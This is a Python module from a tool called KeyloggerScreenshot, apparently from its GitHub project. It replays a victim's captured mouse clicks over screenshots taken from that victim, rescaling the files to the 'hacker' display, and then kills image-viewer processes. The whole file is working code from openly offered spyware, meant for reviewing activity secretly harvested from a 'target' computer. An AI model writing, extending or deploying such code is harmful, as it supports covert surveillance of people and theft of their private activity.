import threading
import pyautogui as pg
import sys
import os
import ast
import time
import PIL.Image
import tkinter as tk
import BetterPrinting as bp
import subprocess


class Simulation:
    seconds = None
    startbutton = None

    @staticmethod
    def countdown():
        real_sec = Simulation.seconds
        seconds = Simulation.seconds + 4
        # Plus four seconds because of the time the code sleeps

        if sys.platform == "linux":
            size = "295x367"
        else:
            size = "250x415"

        tkWindow = tk.Tk()
        tkWindow.geometry(size)
        tkWindow.title('KeyloggerScreenshot')
        minutes = seconds // 60
        this_min = minutes * 60
        this_sec = seconds - this_min
        print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")

        while seconds:  # Same like Timer Class
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1
        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
        # GUI BY: DYMA020
        Simulation.startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10,
                                           width=30)
        # Puts everything on place
        Simulation.startbutton.grid(row=1, column=0)
        if real_sec < 60:
            text = f"Simulation for {real_sec} seconds"
        else:
            m, s = divmod(real_sec, 60)
            timer = '{:02d}:{:02d}'.format(m, s)
            text = f"Simulation for {timer} minutes"
        # Just for decoration
        tk.Button(tkWindow, text=text, command=Simulation.connection, height=10, width=30).grid(row=2, column=0)
        tkWindow.mainloop()

    @staticmethod
    def changecol():  # This function is here to if the simulation has ended
        Simulation.startbutton.configure(bg="red")
        # This is the button
        Simulation.startbutton["text"] = "Stop simulation"
        if sys.platform != "linux":
            data = subprocess.check_output("tasklist")
            # This lists all the tasks that are open on windows
            str_data = str(data).split()
            # Splits the data
            all_exe = [(exe.replace(r"K\\r\\n", "").replace(r"K\r\n", ""), str_data[idx + 1]) for idx, exe in
                       enumerate(str_data) if ".exe" in exe]
            # This removes all unnecessary characters and stores all .exe files with their pid number in this list
            photo = [(task, pid) for task, pid in all_exe if task == "PhotosApp.exe"]
            # photo searches for the right pid to kill the process

            if photo:
                os.system(f"taskkill /f /PID {photo[0][1]}")
                # Kills the photos with it pid number

        else:
            linux_data = subprocess.run(["ps", "aux"], capture_output=True)
            # This lists all the tasks that are open on linux
            this_data = str(linux_data).split()
            # Same code as above
            all_pid = [this_data[idx - 10] for idx, this_pid in enumerate(this_data) if ".PNG" in this_pid]
            # This the linux version of stopping the process of all Images that are open

            if all_pid:  # If "all_pid" is not empty this line will be executed
                for pid in all_pid: os.system(f"kill -15 {pid}")
                # This is the command which kills the process

        os._exit(0)

    @staticmethod
    def connection():
        print("Successful connection")

    @staticmethod
    def start_simulation():
        mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
        # Looks for coordinates in mouseInfoLog

        if not mouse_coordinates:
            # If there isn't a file called mouseInfoLog it will destroy itself
            print("\nThe target hasn't clicked anything")
            print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
            sys.exit()

        every_coordinate = []
        for each_core in mouse_coordinates:
            fhandle = open(each_core)
            for line in fhandle:
                if "[" in line:
                    every_coordinate += ast.literal_eval(line)
                    # This makes a list out of a string

        img_files = [each_img for each_img in os.listdir() if "Image_Target" in each_img]
        # This checks for all Images in the directory

        if not img_files:
            print('There is no "Image_Target" in this directory')
            os._exit(0)

        # This is here so every kind of display will be shown correctly
        try:
            get_size = PIL.Image.open(img_files[0])

            # opens the image
            target_size_x, target_size_y = get_size.size
            # Gets the size of the image with x and y
            hacker_size_x, hacker_size_y = pg.size()
            # Gets the size of the hacker with x and y

            difference_x, difference_y = hacker_size_x / target_size_x, hacker_size_y / target_size_y
            # This is the difference between the two. For example 1920x1080 = hacker and 1366x768 = target.
            # To rescale the image the x position of the target will be divided by the x position of the hacker
            new_coordinates = [(round(new_x * difference_x), round(new_y * difference_y)) for new_x, new_y in
                               every_coordinate]
            # Stores the rescaled coordinates into a list
            for img in img_files:
                image = PIL.Image.open(img)
                # Opens the image
                new_image = image.resize((hacker_size_x, hacker_size_y))
                # Resizes every image to the size of the hacker display
                new_image.save(img)
                # Saves the image in the same directory

            pg.FAILSAFE = False
            # This is for the corner allowance
            img_seconds = 5.572
            # This is the speed it takes to open the image
            speed = 0.47
            # This is the time each coordinate needs
            sleep = 1.5
            # This is the time, where the code is taking a time out
            one_coordinate = speed + sleep

            if sys.platform != "linux":  # This calculation is for windows
                # This is for the corner allowance
                img_seconds = 5.572
                # This is the speed it takes to open the image
                speed = 0.47
                # This is the time each coordinate needs
                escape = 0.1
                # This is the time the program needs to escape an image
                one_coordinate = speed + sleep
                duration_seconds = one_coordinate * len(every_coordinate)
                one_image = duration_seconds + img_seconds + escape
                Simulation.seconds = round(one_image * len(img_files))
                # This calculates the amount it will take

            else:
                # Same code as above but this is for linux
                open_img = 2.7
                one_cor = 1.9
                all_cor = one_cor * len(every_coordinate)
                esc = 0.1
                this_img = all_cor + open_img + esc
                Simulation.seconds = round(this_img * len(img_files))
            # This calculates the amount it will take

            print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
            threading_count = threading.Thread(target=Simulation.countdown, args=(Simulation.seconds,))
            # The countdown will start
            threading_count = threading.Thread(target=Simulation.countdown)
            # The countdown will start
            threading_count.start()

            pg.sleep(4)
            for image in img_files:
                im = PIL.Image.open(image)
                try:
                    # Opens the image
                    im.show()
                    time.sleep(2)
                    pg.press("f11")
                    # Makes the image in the perfect resolution
                    for x, y in new_coordinates:
                        pg.moveTo(x, y, 0.3)
                        time.sleep(sleep)
                    pg.press("esc")
                except RuntimeError:
                    bp.color(
                        '\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',
                        "red")
                    os._exit(0)
                    
        except NameError:
            print("YOU CAN ONLY RUN THIS SIMULATION ON A DESKTOP ENVIRONMENT")
            
